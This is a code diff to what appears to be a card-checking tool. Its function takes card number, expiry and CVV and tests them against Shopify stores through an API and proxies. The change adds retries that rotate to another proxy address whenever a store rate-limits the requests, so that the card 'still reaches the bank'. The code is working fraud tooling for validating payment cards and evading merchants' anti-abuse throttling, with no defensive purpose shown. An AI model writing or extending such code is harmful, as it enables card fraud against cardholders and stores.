@@ -171,19 +171,48 @@ async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=120,
     if price_max is not None:
         params["max_price"] = str(price_max)
 
-    try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.get(
-                f"{SHOPIFY_API_URL}/shopify",
-                params=params,
-                timeout=aiohttp.ClientTimeout(total=timeout),
-            ) as resp:
-                body = await resp.json(content_type=None)
-    except Exception as e:
-        logger.warning("shopify api failed: %s", str(e)[:120])
+    # A store that is rate limiting us says so, and that is not a word
+    # about the card.  The check is made again from another address,
+    # so the card still reaches the bank.
+    body = None
+    last_error = ""
+    for attempt in range(3):
+        try:
+            async with aiohttp.ClientSession() as sess:
+                async with sess.get(
+                    f"{SHOPIFY_API_URL}/shopify",
+                    params=params,
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                ) as resp:
+                    body = await resp.json(content_type=None)
+        except Exception as e:
+            last_error = f"{type(e).__name__}: {str(e)[:100]}"
+            body = None
+
+        throttled = False
+        if isinstance(body, dict):
+            code = str(body.get("Response", "") or "").strip()
+            low = (code + " " + str(body.get("Message", "") or "")).lower()
+            throttled = ("throttled" in low or "rate limit" in low
+                         or "429" in low or "too many" in low
+                         or "proxy_error" in low)
+        if body is None and last_error:
+            throttled = True
+        if not throttled or attempt >= 2:
+            break
+
+        # the next try leaves from another address
+        if params.get("proxy"):
+            proxies = [p for p in str(params["proxy"]).split(",") if p]
+            if len(proxies) > 1:
+                params["proxy"] = ",".join(proxies[1:] + proxies[:1])
+        await asyncio.sleep(1 + attempt)
+
+    if not isinstance(body, dict) or not body:
+        logger.warning("shopify api failed: %s", last_error[:120])
         return {
             "status": "error",
-            "response": f"API error: {type(e).__name__}: {str(e)[:100]}",
+            "response": f"API error: {last_error or 'no answer'}",
             "gateway": "Shopify Payments",
             "amount": None,
             "site": site,
